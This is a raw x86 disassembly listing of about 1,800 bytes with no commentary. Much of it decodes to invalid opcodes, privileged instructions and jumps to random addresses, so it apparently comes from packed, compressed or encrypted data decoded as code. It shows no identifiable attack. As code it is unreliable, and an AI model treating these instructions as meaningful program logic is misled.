  420e8e:	xlat   BYTE PTR ds:[ebx]
  420e8f:	sbb    BYTE PTR [ecx-0x23ad0299],ah
  420e95:	cmc    
  420e96:	adc    eax,0xa59f140
  420e9b:	dec    edx
  420e9c:	stos   BYTE PTR es:[edi],al
  420e9d:	sub    bl,BYTE PTR [eax]
  420e9f:	retf   
  420ea0:	fist   WORD PTR [edi+0x3db809e8]
  420ea6:	cli    
  420ea7:	jmp    0x285066b0
  420eac:	cmc    
  420ead:	xchg   DWORD PTR [edx*4+0x55e07777],esi
  420eb4:	adc    esi,ebp
  420eb6:	xor    al,0x8e
  420eb8:	pop    esp
  420eb9:	xchg   ecx,eax
  420eba:	sbb    DWORD PTR [edx-0x6895b5b6],0xcc379393
  420ec4:	pop    esi
  420ec5:	and    eax,0x8f02e2a8
  420eca:	mov    edi,0xaf097be
  420ecf:	push   ecx
  420ed0:	retf   0xf61c
  420ed3:	or     esp,DWORD PTR [esi-0x6e]
  420ed6:	in     eax,dx
  420ed7:	dec    eax
  420ed8:	xor    al,0x6a
  420eda:	arpl   WORD PTR [eax+ebp*8],cx
  420edd:	inc    esp
  420ede:	mov    dh,0x9f
  420ee0:	jmp    0x420f59
  420ee2:	cmp    al,0x76
  420ee4:	jp     0x420f26
  420ee6:	or     eax,0xca8b7658
  420eeb:	xchg   ebp,eax
  420eec:	mov    edi,0x95af891a
  420ef1:	hlt    
  420ef2:	xor    DWORD PTR [ecx+0x71a797dc],eax
  420ef8:	js     0x420eca
  420efa:	aad    0xc3
  420efc:	cdq    
  420efd:	sub    eax,0x750edd95
  420f02:	loopne 0x420f35
  420f04:	ins    DWORD PTR es:[edi],dx
  420f05:	sti    
  420f06:	addr16 in eax,0x9b
  420f09:	sub    ecx,esp
  420f0b:	and    eax,DWORD PTR [edx-0x51]
  420f0e:	pop    edx
  420f0f:	push   ebx
  420f10:	int3   
  420f11:	or     al,0xb8
  420f13:	das    
  420f14:	inc    edi
  420f15:	xchg   edi,eax
  420f16:	(bad)  
  420f17:	test   al,0x2a
  420f19:	jmp    0x420f2c
  420f1b:	in     al,dx
  420f1c:	push   ss
  420f1d:	lock adc al,0x1f
  420f20:	mov    WORD PTR [edx-0x50],cs
  420f23:	outs   dx,BYTE PTR ds:[esi]
  420f24:	push   eax
  420f25:	sub    BYTE PTR [edx+0x10],bl
  420f28:	pop    eax
  420f29:	arpl   dx,dx
  420f2b:	into   
  420f2c:	mov    eax,edi
  420f2e:	jnp    0x420eb1
  420f30:	fs jmp 0xa3c98fc5
  420f36:	cmp    DWORD PTR [ecx+edx*2+0x22],edx
  420f3a:	sbb    al,0x58
  420f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f3d:	out    0xd5,eax
  420f3f:	sbb    al,0xa7
  420f41:	sti    
  420f42:	fist   DWORD PTR [eax+0x5265e003]
  420f48:	fcom   QWORD PTR [ebp+0x31b6bdf8]
  420f4e:	inc    edx
  420f4f:	scas   al,BYTE PTR es:[edi]
  420f50:	inc    ebp
  420f51:	jo     0x420f8b
  420f53:	pop    edx
  420f54:	and    DWORD PTR [eax+0xae66c20],edi
  420f5a:	push   0x31
  420f5c:	mov    al,ds:0x6f1dc77a
  420f61:	push   cs
  420f62:	ins    BYTE PTR es:[edi],dx
  420f63:	popa   
  420f64:	sbb    bh,BYTE PTR [ebx]
  420f66:	test   ebx,eax
  420f68:	aam    0xca
  420f6a:	sub    dl,bh
  420f6c:	je     0x420fb4
  420f6e:	rcl    BYTE PTR [ecx+0x19],0xbc
  420f72:	ja     0x420fbc
  420f74:	pop    ss
  420f75:	add    al,0x9c
  420f77:	jmp    0x420f51
  420f79:	dec    ebx
  420f7a:	inc    esp
  420f7b:	(bad)  
  420f7c:	mov    ds:0xdff02652,al
  420f81:	scas   eax,DWORD PTR es:[edi]
  420f82:	mov    eax,ds:0x45084b4a
  420f87:	mov    dh,0xeb
  420f89:	sub    DWORD PTR [ecx+0x72],ebx
  420f8c:	mov    ebp,0xa035191
  420f91:	dec    esi
  420f92:	and    BYTE PTR [edi],0x3d
  420f95:	xchg   ebp,eax
  420f96:	test   DWORD PTR [ecx],0x94312eb2
  420f9c:	add    al,0x4
  420f9e:	stc    
  420f9f:	js     0x420fd5
  420fa1:	and    ebp,DWORD PTR [eax+edx*2]
  420fa4:	rol    bl,1
  420fa6:	stos   DWORD PTR es:[edi],eax
  420fa7:	push   esp
  420fa8:	lock outs dx,BYTE PTR ds:[esi]
  420faa:	inc    edx
  420fab:	in     al,dx
  420fac:	popa   
  420fad:	imul   eax,DWORD PTR [edi],0xffffff8a
  420fb0:	jb     0x420f38
  420fb2:	mov    cl,0xeb
  420fb4:	out    dx,al
  420fb5:	sbb    eax,0xd850c550
  420fba:	xor    al,0x9
  420fbc:	jnp    0x420fb1
  420fbe:	pop    ds
  420fbf:	cs add ebp,ebx
  420fc2:	add    BYTE PTR [esi+0x528a048b],0x45
  420fc9:	cld    
  420fca:	jns    0x420f79
  420fcc:	imul   edx,DWORD PTR [edi],0xfbb9ae0d
  420fd2:	stc    
  420fd3:	jecxz  0x421018
  420fd5:	and    ecx,DWORD PTR ds:0x4cb7e90f
  420fdb:	push   esi
  420fdc:	sbb    BYTE PTR [ebp-0x6c],cl
  420fdf:	xor    ch,BYTE PTR [edx+0x32]
  420fe2:	(bad)  
  420fe3:	pop    ebp
  420fe4:	pop    ebx
  420fe5:	inc    eax
  420fe6:	pop    DWORD PTR [ebp-0x5aa4d7ad]
  420fec:	mov    dl,0x8e
  420fee:	or     eax,0xa1d30c69
  420ff3:	and    al,0x37
  420ff5:	cs mov ah,bl
  420ff8:	push   ebx
  420ff9:	not    DWORD PTR [edi]
  420ffb:	dec    ebx
  420ffc:	aam    0x94
  420ffe:	inc    ebx
  420fff:	xchg   esi,eax
  421000:	scas   al,BYTE PTR es:[edi]
  421001:	push   ecx
  421002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421003:	icebp  
  421004:	jl     0x42105f
  421006:	jmp    0x420fd2
  421008:	mov    cl,0x9c
  42100a:	and    eax,0x1789147b
  42100f:	call   0xc03ce59c
  421014:	push   ss
  421015:	scas   eax,DWORD PTR es:[edi]
  421016:	jne    0x421097
  421018:	fwait
  421019:	sbb    eax,0xcbd095e6
  42101e:	sub    eax,0x3d38cca
  421023:	das    
  421024:	cmp    BYTE PTR [ecx-0x68137053],dl
  42102a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42102b:	dec    esp
  42102c:	icebp  
  42102d:	dec    cl
  42102f:	dec    eax
  421030:	test   eax,0xb53cc28f
  421035:	ret    
  421036:	push   0x6285bef4
  42103b:	xor    dh,BYTE PTR [ecx-0xcaf0a9f]
  421041:	pop    eax
  421042:	fnstsw WORD PTR [ebx+0x3a]
  421045:	sbb    eax,0x8e71a9be
  42104a:	push   esp
  42104b:	ror    DWORD PTR [eax+ecx*4+0x5c023822],cl
  421052:	pop    ds
  421053:	pop    ecx
  421054:	push   0x9e9b3a32
  421059:	in     eax,0xb8
  42105b:	aas    
  42105c:	xchg   esi,eax
  42105d:	xor    esp,DWORD PTR [ecx+0x33]
  421060:	cdq    
  421061:	jp     0x421068
  421063:	enter  0x81bc,0x84
  421067:	cmp    cl,ch
  421069:	add    ah,bh
  42106b:	sbb    al,0x3c
  42106d:	in     eax,dx
  42106e:	enter  0xaf6c,0xbb
  421072:	fdiv   DWORD PTR [ebp+0x37]
  421075:	mov    ds:0xab5e2f9c,al
  42107a:	inc    edx
  42107b:	jns    0x421067
  42107d:	popa   
  42107e:	pop    esi
  42107f:	cmp    eax,0xe4b5e144
  421084:	sbb    BYTE PTR [esi+ecx*1],0xa1
  421088:	out    dx,al
  421089:	add    esi,DWORD PTR [ecx-0x618dcc51]
  42108f:	pop    ebp
  421090:	mov    esi,0x37dd3195
  421095:	jbe    0x4210b4
  421097:	test   eax,0xa1cecf3e
  42109c:	je     0x421045
  42109e:	mov    al,ds:0x95916c22
  4210a3:	sar    BYTE PTR [ecx-0x10045409],0x7b
  4210aa:	clc    
  4210ab:	lds    edi,FWORD PTR ds:0x8d5fabd4
  4210b1:	sub    dl,dl
  4210b3:	je     0x4210ba
  4210b5:	sbb    DWORD PTR [esi+0x41],0x3b3d7f45
  4210bc:	rol    BYTE PTR [ebp-0x6e8f8361],1
  4210c2:	lahf   
  4210c3:	pop    edi
	...
  4210d0:	add    BYTE PTR [edx+0x70],cl
  4210d3:	fdivr  DWORD PTR [edx+edi*8-0x4]
  4210d7:	out    dx,al
  4210d8:	jbe    0x4210cf
  4210da:	outs   dx,DWORD PTR ds:[esi]
  4210db:	cmp    al,0xe0
  4210dd:	mul    BYTE PTR [ebx-0x75909784]
  4210e3:	add    DWORD PTR [eax],eax
  4210e5:	stos   DWORD PTR es:[edi],eax
  4210e6:	add    eax,DWORD PTR [eax]
  4210e8:	add    al,dh
  4210ea:	outs   dx,DWORD PTR ds:[esi]
  4210eb:	fs push 0x3236ddf5
  4210f1:	xchg   ebx,eax
  4210f2:	iret   
  4210f3:	inc    edi
  4210f4:	ja     0x42116c
  4210f6:	sbb    al,0xbf
  4210f8:	xchg   esp,eax
  4210f9:	icebp  
  4210fa:	cdq    
  4210fb:	xor    eax,0x2840a7c8
  421100:	fiadd  DWORD PTR ds:[eax-0x13]
  421104:	arpl   WORD PTR [edx+eax*1],si
  421107:	loopne 0x4210bf
  421109:	jo     0x4210c1
  42110b:	and    eax,0x15c073dc
  421110:	jp     0x421152
  421112:	fcomip st,st(4)
  421114:	imul   eax,DWORD PTR [ebp+0x4517fcaa],0x2e9999b2
  42111e:	jg     0x421103
  421120:	jmp    0x1022b2b6
  421125:	(bad)  
  421126:	int3   
  421127:	or     ebx,DWORD PTR [ebx+0x3b]
  42112a:	out    0xd,al
  42112c:	cmp    bl,BYTE PTR [ecx+0x5f637d2f]
  421132:	mov    ch,0xbe
  421134:	mov    ds:0xcd4fa01b,eax
  421139:	mov    esp,0x411a1f7d
  42113e:	nop
  42113f:	sbb    BYTE PTR [edx-0x29],dl
  421142:	int    0x81
  421144:	inc    eax
  421145:	mov    ds:0x8eba2352,eax
  42114a:	or     al,0xb8
  42114c:	or     esi,DWORD PTR [eax+0x630ab6f0]
  421152:	dec    ebp
  421153:	adc    DWORD PTR [ebp-0x6a90190f],ebx
  421159:	int    0xa3
  42115b:	aas    
  42115c:	ret    
  42115d:	je     0x421106
  42115f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421160:	inc    esp
  421161:	in     al,dx
  421162:	mov    ch,0x1b
  421164:	test   al,0xab
  421166:	cs in  al,dx
  421168:	cmp    ebx,edx
  42116a:	sub    cl,al
  42116c:	cmp    al,0x73
  42116e:	(bad)  
  42116f:	outs   dx,DWORD PTR ds:[esi]
  421170:	out    dx,eax
  421171:	jge    0x4211ea
  421173:	push   ebx
  421174:	fld    TBYTE PTR [ecx+0x21]
  421177:	(bad)  
  421178:	clc    
  421179:	pop    eax
  42117a:	adc    DWORD PTR [ebx+ebx*1],esp
  42117d:	dec    esi
  42117e:	xor    dl,bl
  421180:	in     al,0xed
  421182:	cmc    
  421183:	into   
  421184:	mov    ecx,0x30553ccd
  421189:	push   ss
  42118a:	or     ah,dl
  42118c:	pop    edi
  42118d:	adc    eax,0x77af3b31
  421192:	cdq    
  421193:	push   edi
  421194:	ja     0x421190
  421196:	leave  
  421197:	int    0x92
  421199:	outs   dx,DWORD PTR ds:[esi]
  42119a:	pop    esi
  42119b:	jl     0x421141
  42119d:	dec    edx
  42119e:	sub    bh,bh
  4211a0:	mov    cl,0x58
  4211a2:	adc    ecx,DWORD PTR [edx-0x4fd39046]
  4211a8:	push   ebx
  4211a9:	dec    eax
  4211aa:	int    0x88
  4211ac:	(bad)  
  4211ad:	call   0x594f3c54
  4211b2:	test   esp,esp
  4211b4:	mov    al,ds:0xc5e87cf3
  4211b9:	sbb    DWORD PTR [ebp-0x18],esi
  4211bc:	lds    edx,FWORD PTR ds:0xe96464b1
  4211c2:	sar    ebx,0x6
  4211c5:	repnz mov cl,0xb8
  4211c8:	cmp    eax,0x1e0b8bd3
  4211cd:	mov    edx,DWORD PTR [ebx+0xc]
  4211d0:	dec    ebp
  4211d1:	mov    ebx,0x1ad24b3f
  4211d6:	sub    eax,0x87146b05
  4211db:	lock loop 0x421246
  4211de:	add    eax,0xb24f0a11
  4211e3:	ds dec edx
  4211e5:	xchg   ebx,eax
  4211e6:	mov    ah,dl
  4211e8:	mov    bh,0xd3
  4211ea:	xchg   DWORD PTR [ebx],edi
  4211ec:	cmp    edi,DWORD PTR [ebp+0x4b7b77a4]
  4211f2:	mov    fs,WORD PTR [eax]
  4211f4:	repnz dec edx
  4211f6:	fdivr  st,st(4)
  4211f8:	fiadd  DWORD PTR [edi-0x23a66768]
  4211fe:	mov    bl,0xa3
  421200:	mov    edi,0x2cb89d3a
  421205:	cmp    DWORD PTR ss:[ebp-0x52],edi
  421209:	cdq    
  42120a:	mov    edi,0x7e2370f3
  42120f:	pop    eax
  421210:	push   ebx
  421211:	stos   DWORD PTR es:[edi],eax
  421212:	xchg   BYTE PTR [eax],dh
  421214:	dec    ecx
  421215:	bound  eax,QWORD PTR [eax+0x21490ece]
  42121b:	loop   0x4211af
  42121d:	popf   
  42121e:	xchg   ecx,eax
  42121f:	aam    0xd2
  421221:	inc    ebp
  421222:	dec    ebp
  421224:	pop    edi
  421225:	or     ah,dh
  421227:	(bad)  
  421228:	test   DWORD PTR [edi+0xd],0x337a7de3
  42122f:	data16 daa 
  421231:	into   
  421232:	mov    bl,0x80
  421234:	add    al,cl
  421236:	in     al,dx
  421237:	fistp  QWORD PTR [ebx+0x1799d369]
  42123d:	inc    edx
  42123e:	addr16 cmp al,0x82
  421241:	mov    ds:0xf4c50a09,al
  421246:	xor    BYTE PTR [ecx+ebp*8-0x67ab9524],al
  42124d:	xlat   BYTE PTR ds:[ebx]
  42124e:	pop    es
  42124f:	jae    0x4211db
  421251:	cmp    ebp,DWORD PTR [eax-0x6c63726f]
  421257:	add    al,0x62
  421259:	(bad)  
  42125a:	sbb    al,0x7c
  42125c:	out    0x3a,eax
  42125e:	shl    DWORD PTR [ebp+0x59],cl
  421261:	xor    ecx,0xc76bce03
  421267:	dec    edx
  421268:	mov    ch,0x6d
  42126a:	mov    dl,0xfd
  42126c:	in     al,0x1f
  42126e:	jns    0x4212ef
  421270:	adc    eax,0x51a43fdd
  421275:	retf   
  421276:	lods   eax,DWORD PTR ds:[esi]
  421277:	inc    ebp
  421278:	outs   dx,BYTE PTR ds:[esi]
  421279:	iret   
  42127a:	cmp    eax,ecx
  42127c:	add    dl,ch
  42127e:	pop    ecx
  42127f:	in     al,dx
  421280:	mov    eax,0xa59ba2f2
  421285:	jl     0x421209
  421287:	sub    al,0xea
  421289:	aas    
  42128a:	fld    DWORD PTR [ebx-0x59]
  42128d:	mov    ebp,0xfcde13b0
  421292:	clc    
  421293:	je     0x42125a
  421295:	inc    esi
  421296:	sub    edx,ebx
  421298:	(bad)  
  421299:	mul    al
  42129b:	ret    
  42129c:	or     al,0x94
  42129e:	xchg   edx,eax
  42129f:	stos   BYTE PTR es:[edi],al
  4212a0:	out    dx,eax
  4212a1:	pop    ds
  4212a2:	jae    0x421317
  4212a4:	sub    al,0xbc
  4212a6:	sar    BYTE PTR [ecx],0x30
  4212a9:	mov    eax,ds:0x96c30e35
  4212ae:	jae    0x42126e
  4212b0:	xchg   esi,eax
  4212b1:	xor    eax,0x47258b4c
  4212b6:	add    dl,dh
  4212b8:	clc    
  4212b9:	out    0xba,eax
  4212bb:	adc    bh,BYTE PTR [ecx+0x1f283104]
  4212c1:	out    0x49,eax
  4212c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212c4:	pushf  
  4212c5:	mov    ah,0x45
  4212c7:	dec    esp
  4212c8:	stos   BYTE PTR es:[edi],al
  4212c9:	mov    WORD PTR [ebx],ds
  4212cb:	sar    BYTE PTR [edi-0x81583],cl
  4212d1:	xchg   esp,eax
  4212d2:	test   DWORD PTR [ecx],esp
  4212d4:	fs mov esp,0xb71ade27
  4212da:	push   ds
  4212db:	imul   DWORD PTR [edx+0x18bdfe6f]
  4212e1:	aaa    
  4212e2:	jle    0x4212b5
  4212e4:	pop    edi
  4212e5:	jge    0x421361
  4212e7:	jnp    0x4212bb
  4212e9:	mov    edx,?
  4212eb:	jae    0x421364
  4212ed:	fstp   st(5)
  4212ef:	cmp    BYTE PTR [eax],ah
  4212f1:	add    esi,ebp
  4212f3:	(bad)  
  4212f4:	fsub   QWORD PTR [ebp+edx*4-0x4f]
  4212f8:	xor    eax,0xbcf3eeed
  4212fd:	fbstp  TBYTE PTR [esi-0x24]
  421300:	push   edx
  421301:	mov    ebp,0xa3525835
  421306:	aam    0x64
  421308:	inc    DWORD PTR [edi+0x3a538789]
  42130e:	mov    ebp,0x969e7069
  421313:	sbb    dl,BYTE PTR [edx]
  421315:	getsec 
  421317:	sub    BYTE PTR [eax],ah
  421319:	pop    esp
  42131a:	sub    BYTE PTR [ebx+0xc],dl
  42131d:	(bad)  
  42131e:	or     eax,0xd3c1e66
  421323:	fiadd  DWORD PTR [ecx]
  421325:	fld    TBYTE PTR fs:[ebx-0x37]
  421329:	aam    0x61
  42132b:	fs in  eax,0xd8
  42132e:	and    DWORD PTR [ebp+0x202f228e],0xbacf443d
  421338:	push   ds
  421339:	jmp    0x421346
  42133b:	push   es
  42133c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42133d:	jae    0x4213af
  42133f:	stos   DWORD PTR es:[edi],eax
  421340:	lods   al,BYTE PTR ds:[esi]
  421341:	out    0xb8,eax
  421343:	daa    
  421344:	shl    BYTE PTR [ecx+0x4c],0xee
  421348:	push   0x47
  42134a:	jne    0x42136c
  42134c:	dec    esi
  42134d:	xchg   edi,eax
  42134e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42134f:	add    edi,edi
  421351:	sub    al,BYTE PTR [ebp-0xabe5834]
  421357:	test   al,0xa0
  421359:	cmp    eax,DWORD PTR [eax-0x2]
  42135c:	adc    DWORD PTR [esi-0x1f],edx
  42135f:	call   0xf91bf45b
  421364:	cdq    
  421365:	mov    ecx,0xf698481b
  42136a:	retf   
  42136b:	cmp    dh,al
  42136d:	loope  0x4213aa
  42136f:	xor    DWORD PTR [edx+0x72],edx
  421372:	ror    BYTE PTR [ebp-0x2b9a2aca],cl
  421378:	sbb    al,0xfd
  42137a:	mov    ebx,0xdf6aa9a
  42137f:	test   DWORD PTR [esi],ebp
  421381:	test   eax,0xcb399aaa
  421386:	xor    eax,0xabe5e084
  42138b:	jnp    0x421315
  42138d:	dec    esp
  42138e:	xchg   DWORD PTR [edx*1+0x2835d50],eax
  421395:	in     al,dx
  421396:	outs   dx,BYTE PTR ds:[esi]
  421397:	push   edi
  421398:	push   ecx
  421399:	jecxz  0x421339
  42139b:	enter  0xebe3,0x36
  42139f:	and    BYTE PTR [edi+0x3f218f01],0x23
  4213a6:	mov    ecx,0x4e9b6757
  4213ab:	je     0x4213ca
  4213ad:	jecxz  0x4213db
  4213af:	(bad)  
  4213b0:	push   ebp
  4213b1:	cwde   
  4213b2:	jo     0x42142e
  4213b4:	dec    BYTE PTR [ebx]
  4213b6:	pop    es
  4213b7:	call   0xd3c10abd
  4213bc:	jge    0x421427
  4213be:	sbb    DWORD PTR [esi-0x2bfb63a6],esp
  4213c4:	xor    eax,0x140db99d
  4213c9:	ret    0x4e97
  4213cc:	aaa    
  4213cd:	jl     0x42139b
  4213cf:	popf   
  4213d0:	cmp    ebx,DWORD PTR [edx+ecx*8]
  4213d3:	ror    bh,0xb
  4213d6:	in     eax,dx
  4213d7:	(bad)  
  4213d8:	frstor [eax+0x9]
  4213db:	inc    esi
  4213dc:	pop    ebp
  4213dd:	adc    eax,0x7dad160b
  4213e2:	and    DWORD PTR [ecx],eax
  4213e4:	pop    es
  4213e5:	pop    ecx
  4213e6:	push   0x29db0f6c
  4213eb:	pusha  
  4213ec:	cmp    DWORD PTR [edi-0x1a],0xffffff90
  4213f0:	jp     0x42145a
  4213f2:	adc    edx,ebp
  4213f4:	mov    dl,0x42
  4213f6:	or     ebp,DWORD PTR [ecx+eax*8-0x49]
  4213fa:	and    eax,0xeb8eb189
  4213ff:	into   
  421400:	jg     0x42144e
  421402:	int    0x6f
  421404:	je     0x421470
  421406:	hlt    
  421407:	mov    cl,0x10
  421409:	push   0xb5337537
  42140e:	fsubrp st(1),st
  421410:	sbb    al,0x88
  421412:	retf   0xd656
  421415:	push   ebx
  421416:	push   esi
  421417:	jp     0x42140e
  421419:	aad    0x37
  42141b:	mov    cl,0xc7
  42141d:	out    0xe,eax
  42141f:	pusha  
  421420:	(bad)  
  421421:	sbb    al,0x1f
  421423:	cld    
  421424:	stc    
  421425:	push   esi
  421426:	push   0x5f
  421428:	cmc    
  421429:	bnd jne 0x42148c
  42142c:	adc    bl,ch
  42142e:	pop    ebp
  42142f:	xchg   ebx,eax
  421430:	jne    0x42145d
  421432:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421433:	mov    ds:0x78f2f927,ax
  421439:	jmp    0x421475
  42143b:	and    ebx,esp
  42143d:	push   0x223236bc
  421442:	sbb    eax,0x6f672c75
  421447:	and    ah,BYTE PTR [esi-0x1f]
  42144a:	cwde   
  42144b:	jae    0x4213db
  42144d:	mov    esp,DWORD PTR [eax-0x559e86b8]
  421453:	and    BYTE PTR [eax-0x391ae9b0],cl
  421459:	shl    BYTE PTR [esp+edi*1],1
  42145c:	and    edi,DWORD PTR [eax+0xb]
  42145f:	and    eax,0xb9615d09
  421464:	xor    ch,cl
  421466:	add    cl,dl
  421468:	mov    DWORD PTR [ebx+ebx*2],eax
  42146b:	push   esp
  42146c:	push   ebx
  42146d:	mov    eax,ds:0xe5cb538d
  421472:	mov    eax,ds:0xda0bea7b
  421477:	scas   eax,DWORD PTR es:[edi]
  421478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421479:	cmp    BYTE PTR [ebx],dh
  42147b:	mov    al,0xd6
  42147d:	clc    
  42147e:	dec    edi
  42147f:	mov    eax,ds:0x31993c74
  421484:	xlat   BYTE PTR ds:[ebx]
  421485:	dec    ebx
  421486:	ret    0x3576
  421489:	inc    eax
  42148a:	enter  0x38cb,0xa
  42148e:	push   ebp
  42148f:	xchg   DWORD PTR [eax+0xc160b3],edx
	...
  4214a1:	(bad)  
  4214a2:	fld    QWORD PTR [ebx-0x70212c74]
  4214a8:	fstp   QWORD PTR [ebp+0x2279950]
  4214ae:	repnz (bad) 
  4214b0:	outs   dx,DWORD PTR ds:[esi]
  4214b1:	sbb    cl,BYTE PTR [esi+0x3ab0001]
  4214b7:	add    BYTE PTR [eax],al
  4214b9:	mov    DWORD PTR ds:0x679259a4,esi
  4214bf:	mov    bl,0x9e
  4214c1:	scas   eax,DWORD PTR es:[edi]
  4214c2:	test   BYTE PTR [edx],bl
  4214c4:	mov    al,0xb6
  4214c6:	push   0x597047b4
  4214cb:	popa   
  4214cc:	hlt    
  4214cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214ce:	xor    dh,dh
  4214d0:	jl     0x4214fd
  4214d2:	inc    ebp
  4214d3:	xchg   ecx,eax
  4214d4:	xchg   sp,ax
  4214d6:	pop    ds
  4214d7:	sub    edx,DWORD PTR [eax]
  4214d9:	jecxz  0x421544
  4214db:	shl    DWORD PTR [esi],1
  4214dd:	push   esp
  4214de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214df:	mov    ecx,0xb4f5ec99
  4214e4:	jo     0x421484
  4214e6:	pop    ebp
  4214e7:	call   0xabbff8da
  4214ec:	jo     0x421513
  4214ee:	lods   eax,DWORD PTR ds:[esi]
  4214ef:	pusha  
  4214f0:	es ss stc 
  4214f3:	cli    
  4214f4:	mov    esi,DWORD PTR ds:0xfd4b03df
  4214fa:	inc    eax
  4214fb:	cmp    al,0xea
  4214fd:	dec    BYTE PTR [ebx+esi*4]
  421500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421501:	call   DWORD PTR [edx]
  421503:	jmp    0x59efeea8
  421508:	jno    0x42149e
  42150a:	inc    ecx
  42150b:	push   ebx
  42150c:	shl    BYTE PTR [edx+0x9420369],0x75
  421513:	cmp    DWORD PTR [esi+edx*4+0x5446a94a],0xffffffee
  42151b:	xor    bl,al
  42151d:	sub    eax,0xf37277b6
  421522:	or     BYTE PTR [esi-0x52],cl
  421525:	adc    eax,0xd9ecd480
  42152a:	bound  ecx,QWORD PTR [ecx+0x5f]
  42152d:	push   eax
  42152e:	pop    eax
  42152f:	add    cl,BYTE PTR [esi+0x3d]
  421532:	call   0xf49a56ed
  421537:	pop    ss
  421538:	xor    eax,0x3aa2d45a
  42153d:	shl    ah,cl
  42153f:	inc    ecx
  421540:	daa    
  421541:	test   bh,bh
  421543:	mov    al,ds:0xa5816e51
  421548:	inc    ecx
  421549:	push   ebx
  42154a:	aas    
  42154b:	push   cs
  42154c:	jno    0x42153f
  42154e:	mov    ds:0x1e52e79d,eax
  421553:	test   eax,edx
  421555:	mov    ah,0xba
  421557:	push   esi
  421558:	(bad)  
  42155a:	shr    DWORD PTR [edx+0x264ef973],0x10
  421561:	lds    eax,FWORD PTR [edi+edi*4+0x2aaf1bf6]
  421568:	(bad)  
  421569:	fwait
  42156a:	icebp  
  42156b:	dec    ecx
  42156c:	aad    0xb
  42156e:	adc    dl,BYTE PTR [eax+0x7a530b27]
  421574:	mov    esp,0x9cf0b9c6
  421579:	dec    edx
  42157a:	lahf   
  42157b:	or     al,0xf8
  42157d:	retf   
  42157e:	add    eax,0xc79a499f
  421583:	sbb    eax,DWORD PTR [eax]
  421585:	fdivr  st,st(0)
  421587:	nop
  421588:	retf   
  421589:	jo     0x4215b9
  42158b:	jbe    0x421587
  42158d:	addr16 jmp 0x421576
  421590:	dec    edx
  421591:	sbb    eax,0x68e33ea2
  421596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421597:	xchg   BYTE PTR [ebx+0x5d1ac3d5],dh
  42159d:	cld    
  42159e:	push   edi
  42159f:	popa   
  4215a0:	jg     0x421597
  4215a2:	sti    
  4215a3:	and    esi,DWORD PTR ds:0xf8024153
  4215a9:	jmp    0x1ede30c1
  4215ae:	xor    ecx,DWORD PTR [ecx]
  4215b0:	cmp    eax,0x5676bcef
  4215b5:	mov    ecx,0xaadabd1
  4215ba:	lahf   
  4215bb:	repz mov ds:0x77ad9369,al
  4215c1:	xor    eax,0x3337347
  4215c7:	test   BYTE PTR [ebp-0x36],dh
  4215ca:	icebp  
  4215cb:	add    esp,ecx
  4215cd:	in     eax,dx
  4215ce:	cmp    al,0xf8
  4215d0:	into   
  4215d1:	mov    edx,0x5d6e6410
  4215d6:	and    DWORD PTR [esi],edi
  4215d8:	and    DWORD PTR [esi+0x2b],ebx
  4215db:	shr    BYTE PTR [ebp+edi*2-0x7203f7a5],cl
  4215e2:	scas   eax,DWORD PTR es:[edi]
  4215e3:	push   cs
  4215e4:	sti    
  4215e5:	rcr    ch,0xfa
  4215e8:	pusha  
  4215e9:	mov    BYTE PTR [edi+eiz*2-0x2e],0x3
  4215ee:	das    
  4215ef:	inc    edx
  4215f0:	inc    ebx
  4215f1:	jg     0x421576
  4215f3:	mov    ds:0x8e0fc6a8,eax
  4215f8:	fnstsw WORD PTR [edi-0x68]
  4215fb:	pusha  
  4215fc:	jl     0x42163b
  4215fe:	cmp    edx,DWORD PTR [edx]
  421600:	sub    al,BYTE PTR [esi-0x151d9f9d]
  421606:	mov    al,0xcc
  421608:	test   al,0x86
  42160a:	out    dx,eax
  42160b:	mov    eax,0xa089e119
  421610:	shl    BYTE PTR [edx+0x1f],cl
  421613:	adc    al,0x29
  421615:	sub    edx,ebp
  421617:	xor    BYTE PTR [ebx-0x37766fa4],0x37
  42161e:	js     0x421614
  421620:	daa    
  421621:	xlat   BYTE PTR ds:[ebx]
  421622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421623:	mov    ds:0x7dfb6beb,al
  421628:	pop    es
  421629:	xchg   DWORD PTR [edi+0x44],ecx
  42162c:	nop
  42162d:	aas    
  42162e:	stos   BYTE PTR es:[edi],al
  42162f:	add    al,0xfd
  421631:	add    eax,0x53450455
  421636:	dec    esp
  421637:	dec    eax
  421638:	pop    ebp
  421639:	out    dx,al
  42163a:	pushf  
  42163b:	scas   eax,DWORD PTR es:[edi]
  42163c:	sbb    eax,DWORD PTR [ecx+ebx*1]
  42163f:	(bad)  
  421640:	out    dx,al
  421641:	popa   
  421642:	inc    eax
  421643:	ss mov eax,0x5fb20653
  421649:	stos   DWORD PTR es:[edi],eax
  42164a:	and    DWORD PTR [edx],0xffffffb4
  42164d:	scas   al,BYTE PTR es:[edi]
  42164e:	or     ecx,DWORD PTR [ecx]
  421650:	(bad)  
  421651:	and    edi,DWORD PTR ds:0xeb50ce5b
  421657:	retf   
  421658:	adc    al,0xe6
  42165a:	adc    DWORD PTR ds:0xa07c607e,esi
  421660:	xchg   ebx,eax
  421661:	out    dx,eax
  421662:	fcmovne st,st(6)
  421664:	arpl   WORD PTR [edx+0x6f],dx
  421667:	ins    DWORD PTR es:[edi],dx
  421668:	arpl   cx,si
  42166a:	push   ecx
  42166b:	gs adc al,0x91
  42166e:	jnp    0x421650
  421670:	and    al,0x70
  421672:	test   al,0xc9
  421674:	ins    DWORD PTR es:[edi],dx
  421675:	add    al,0xc0
  421677:	xchg   edx,eax
  421678:	inc    eax
  421679:	sbb    dl,cl
  42167b:	sub    cl,BYTE PTR [edx+0x4e]
  42167e:	pop    esi
